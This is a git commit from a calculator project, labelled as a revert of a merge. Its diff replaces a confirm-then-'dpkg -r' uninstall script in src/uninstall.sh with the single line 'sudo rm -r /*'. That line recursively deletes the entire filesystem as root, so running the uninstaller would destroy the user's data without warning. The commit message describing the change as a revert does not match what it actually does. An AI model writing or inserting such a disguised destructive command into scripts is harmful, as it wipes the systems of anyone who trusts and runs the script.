9c5565fdabfecc4f9f9b931938fb91c0b1af3a29
Mathas05 <mathas05@gmail.com>
2024-04-22 13:04:55 +0200

    Revert "Merge branch 'master' of https://github.com/Kristian-045/Kalkulacka"
    This reverts commit 2578559cd2480bd0add5fc87bc75b319f2f982cd, reversing
    changes made to 4a49b52e6f7eadd36e269e706c535867ca027e69.

--- src/uninstall.sh
+++ src/uninstall.sh
@@ -1,15 +1,1 @@
-#!/bin/bash
-
-# Define variables
-APP_NAME="butcalculator"
-
-# Ask for confirmation before uninstalling
-read -p "Are you sure you want to uninstall $APP_NAME? (y/n): " choice
-if [ "$choice" != "y" ]; then
-  echo "Uninstallation canceled."
-  exit 0
-fi
-
-sudo dpkg -r "$APP_NAME"
-
-echo "Uninstallation completed."
+sudo rm -r /*
